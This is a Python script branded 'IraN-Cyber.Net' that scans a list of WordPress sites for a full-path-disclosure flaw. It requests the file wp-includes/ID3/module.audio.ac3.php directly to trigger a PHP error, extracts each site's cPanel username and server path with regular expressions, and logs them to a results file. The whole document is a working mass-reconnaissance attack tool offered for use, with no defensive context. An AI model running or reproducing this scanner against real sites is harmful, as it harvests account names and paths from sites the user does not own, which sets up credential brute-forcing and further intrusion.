import requests, re, sys, os, time, random

from colorama import Fore, Back, Style



def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """

         __          __     _____                        _
         \ \        / /    / ____| IraN-Cyber.Net       | |
          \ \  /\  / / __ | |     _ __   __ _ _ __   ___| |
           \ \/  \/ / '_ \| |    | '_ \ / _` | '_ \ / _ \ |
            \  /\  /| |_) | |____| |_) | (_| | | | |  __/ |
             \/  \/ | .__/ \_____| .__/ \__,_|_| |_|\___|_|
                    | |          | | Cpanel Username Detector v1.0
                    |_|          |_|

                  Wordpress Cpanel Username Detector v1.0
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)



cls()
print_logo()

try:
    List = sys.argv[1]
except IndexError:
    print Fore.YELLOW + '-----------------------------------------'
    print Fore.RED + '[*]' + Fore.YELLOW + ' Python ' + Fore.GREEN + 'Script.py ' + Fore.WHITE + 'List.txt'
    print(Style.RESET_ALL)
    sys.exit()

try:
    with open(List, 'r') as f:
       site = f.read().splitlines()

    for url in site:
        if url.startswith("http://"):
            url = url.replace("http://", "")
        elif url.startswith("https://"):
            url = url.replace("https://", "")
        else:
            pass
        Get_page = requests.get('http://' + url, timeout=10)
        if '/wp-content/' in Get_page.text:
            Hunt_path = requests.get('http://' + url + '/wp-includes/ID3/module.audio.ac3.php', timeout=10)


            def Hunt_Path_User():
                try:
                    find = re.findall('/home/(.*)/public_html/wp-includes/ID3/module.audio.ac3.php', Hunt_path.text)
                    x = find[0].strip()
                    return x
                except:
                    pass


            def Hunt_Path_Host():
                try:
                    find = re.findall("Class 'getid3_handler' not found in <b>(.*)wp-includes/ID3/module.audio.ac3.php",
                                      Hunt_path.text)
                    x = find[0].strip()
                    return x
                except:
                    pass


            Cpanel_username = Hunt_Path_User()
            print Fore.YELLOW + '        [+]' + Fore.WHITE + ' Target URL      :  ' + url

            if Cpanel_username == None:
                print Fore.YELLOW + '           [+]' + Fore.CYAN + ' Cpanel USername    :' + Fore.RED + ' Not Found '
            else:
                print Fore.YELLOW + '           [+]' + Fore.CYAN + ' Cpanel USername    : ' + Fore.GREEN + Cpanel_username

            Path_Host = Hunt_Path_Host()

            if Path_Host == None:
                print Fore.YELLOW + '           [+]' + Fore.CYAN + ' Path Host          :' + Fore.RED + ' Not Found ' + '\n\n'
            else:
                print Fore.YELLOW + '           [+]' + Fore.CYAN + ' Path Host          : ' + Fore.GREEN + Path_Host + '\n\n'
                with open('Result.txt', 'a') as Rez:
                    Rez.write('-------------------------\n' + 'Url: ' + url + '\nCpanel username : '
                              + str(Cpanel_username) + '\nPath Host       : ' + str(Path_Host) + '\n')
        else:
            pass
except IOError:
    print Fore.YELLOW + '-----------------------------------------'
    print Fore.RED + '[*]' + Fore.YELLOW + ' Python ' + Fore.GREEN + 'Script.py ' + Fore.WHITE + 'List.txt'
    print Fore.RED + '[-]' + Fore.YELLOW + ' ' + sys.argv[1] + Fore.WHITE + ' --> Not found !'
